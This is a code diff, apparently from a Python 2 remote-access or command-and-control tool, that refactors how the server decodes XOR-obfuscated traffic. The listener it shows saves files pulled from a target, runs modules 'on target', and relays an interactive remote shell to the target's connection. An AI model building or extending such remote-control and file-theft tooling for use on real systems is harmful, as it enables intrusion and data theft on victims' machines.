@@ -292,23 +292,21 @@ class xor:
             logging.error("Connection to %s failed." % name)
         
         while True:
-            data = conn.recv(socksize)
-            data2 = xor(data, pin)
+            data = xor(conn.recv(socksize), pin)
             
-            if data2.startswith(":savef"):
-                getname = data2.split(" ")
+            if data.startswith(":savef"):
+                getname = data.split(" ")
                 fname = getname[1]
                 logging.info("Saved file %s from %s" % (fname, name))
                 self.download(fname, name)
                 
-            elif data2 == ("Complete"):
+            elif data == ("Complete"):
                 print "[+] Module transfer successful."
                 print "[+] Executing module on target..."
                 
-            elif data2 == "shell => ":
-                cmd = raw_input(data2)
-                cmd2 = xor(cmd, pin)
-                conn.sendall(str(cmd2))
+            elif data == "shell => ":
+                cmd = raw_input(data)
+                conn.sendall(xor(cmd, pin))
                 
                 if cmd == (':killme'):
                     print("[!] Shutting down server!")
@@ -375,8 +373,7 @@ class xor:
                     
                     
             elif data:
-                data2 = xor(data, pin)
-                print data2
+                print data
                 
         conn.close()
         
@@ -399,23 +396,21 @@ class xor:
             print("[!] Connection error!")
             
         while True:
-            data = conn.recv(socksize)
-            data2 = xor(data, pin)
+            data = xor(conn.recv(socksize), pin)
             
-            if data2.startswith(":savef"):
-                getname = data2.split(" ")
+            if data.startswith(":savef"):
+                getname = data.split(" ")
                 fname = getname[1]
                 logging.info("Saved file %s from %s" % (fname, name))
                 self.download(fname, name)
                 
-            elif data2 == ("Complete"):
+            elif data == ("Complete"):
                 print "[+] Module transfer successful."
                 print "[+] Executing module on target..."
                 
-            elif data2 == "shell => ":
-                cmd = raw_input(data2)
-                cmd2 = xor(cmd, pin)
-                conn.sendall(str(cmd2))
+            elif data == "shell => ":
+                cmd = raw_input(data)
+                conn.sendall(xor(cmd, pin))
                 
                 if cmd == (':killme'):
                     print("[!] Shutting down server!")
@@ -482,8 +477,7 @@ class xor:
                     
                     
             elif data:
-                data2 = xor(data, pin)
-                print data2
+                print data
                 
         conn.close()
 
